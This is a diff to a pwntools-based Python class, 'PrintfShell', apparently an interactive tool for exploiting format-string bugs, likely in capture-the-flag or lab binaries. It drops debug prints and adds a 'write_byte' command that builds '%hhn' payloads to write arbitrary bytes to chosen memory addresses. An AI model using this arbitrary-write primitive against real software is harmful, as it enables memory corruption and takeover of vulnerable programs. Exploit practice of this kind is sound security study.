@@ -50,7 +50,6 @@ class PrintfShell(shell.Shell):
         string = self.write(string)
         self.conn.send(string)
         resp = self.conn.recvuntil(self.marker)
-        print(resp)
         return self.read(resp[:-len(self.marker)])
     
     @Command
@@ -102,13 +101,22 @@ class PrintfShell(shell.Shell):
             command += pwnlib.util.packing.p64(start - i)
             command += watchword
             res = self.read_response(command)
-            print(res, watchword)
             if res == watchword + b"\n":
                 self.format_location = start - i
                 print("Found stack at", hex(self.format_location))
                 return
         print("Not found")
-                
+    
+    @Command
+    def write_byte(self, addr :int, n : value):
+        addr = pwnlib.util.packing.p64(int(addr, 16))
+        if n != 0:
+            command = bytes(f"%{n}d%{self.stack_offset+2}$hhn\x00", "ascii")
+        else:
+            command = bytes(f"%{self.stack_offset+2}$hhn\x00", "ascii")
+        command = self.pad(command, 16, b"\x00")
+        command += addr
+        self.read_response(command) # don't really need to read it beyond housecleaning
 
     @Command
     def read_bytes(self, addr : int, n : int):
